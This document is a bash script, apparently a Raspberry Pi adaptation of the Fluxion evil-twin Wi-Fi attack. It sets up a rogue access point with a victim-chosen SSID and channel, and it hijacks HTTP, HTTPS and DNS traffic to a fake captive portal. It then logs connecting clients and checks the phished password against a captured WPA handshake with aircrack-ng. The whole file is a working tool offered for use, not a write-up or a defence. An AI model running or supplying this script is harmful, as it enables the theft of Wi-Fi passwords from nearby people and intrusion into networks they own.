#!/bin/bash

if (( $# < 2 ));
  then
    printf "You need to provide positional arguments - ssid and channel.\nStart the script like this:\nsudo ./fluxPi.sh HotSpot 6\n"
    exit 1
fi


	printf "Creating and copying .conf files\n"
	rm -r /tmp/fluxpi/*
	rm /tmp/fluxpi/*
	mkdir /tmp/fluxpi
	mkdir /tmp/fluxpi/captive_portal
	openssl req -subj '/CN=captive.router.lan/O=CaptivePortal/OU=Networking/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout "/tmp/fluxpi/server.pem" -out "/tmp/fluxpi/server.pem"
	chmod 400 "/tmp/fluxpi/server.pem"

		echo "\
interface=wlan0
driver=nl80211
ssid=$1
channel=$2
\
" > "reqs/hostapd.conf"
	sleep 1
	cp -r reqs/* /tmp/fluxpi/
	ip addr add 192.168.254.1/24 dev wlan0
	cp dump-01.cap /tmp/fluxpi/network.cap
	touch /tmp/fluxpi/captive_portal/clients.txt
	touch /tmp/fluxpi/captive_portal/hit.txt
	# Activate system IPV4 packet routing/forwarding.
	sysctl -w net.ipv4.ip_forward=1 &>wlan0

	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT

	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.254.1:80
	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.254.1:443
	iptables -A INPUT -p tcp --sport 443 -j ACCEPT
	iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
	iptables -t nat -A POSTROUTING -j MASQUERADE

	touch /tmp/fluxpi/dhcpd.leases


	printf "Starting Captive Portal\n"

	killall lighttpd
	killall dhcpd
	killall hostapd
	sleep 1
	xterm -bg black -fg "#CCCC00" -title "FluxPi AP HOSTAPD Service" -e "hostapd /tmp/fluxpi/hostapd.conf" &
	sleep 1
	xterm -bg black -fg "#CCCC00" -title "FluxPi AP DHCP Service" -e "dhcpd -d -f -lf \"/tmp/fluxpi/dhcpd.leases\" -cf \"/tmp/fluxpi/dhcpd.conf\" wlan0 | tee -a \"/tmp/fluxpi/captive_portal/clients.txt\"" &
	sleep 1
	chmod +x /tmp/fluxpi/fluxion_captive_portal_dns.py
	xterm -bg black -fg "#99CCFF" -title "FluxPi AP DNS Service" -e "sudo python /tmp/fluxpi/fluxion_captive_portal_dns.py" &
	lighttpd -f /tmp/fluxpi/lighttpd.conf
	xterm -bg black -fg "#00CC00" -title "FluxPi Web Service" -e "tail -f \"/tmp/fluxpi/lighttpd.log\"" &
	sleep 1
	chmod +x /tmp/fluxpi/captive_portal_authenticator.sh
	xterm -bg black -fg "#CCCCCC" -title "FluxPi AP Authenticator" -e "/tmp/fluxpi/captive_portal_authenticator.sh" &
	printf "\n"
	read -p "Press [Enter] key to start backup..."
	printf "\n"
	killall dhcpd
	killall xterm
	killall lighttpd
	killall hostapd
	aircrack-ng -a 2 -0 -s "/tmp/fluxpi/network.cap" -w "/tmp/fluxpi/captive_portal/candidate.txt"
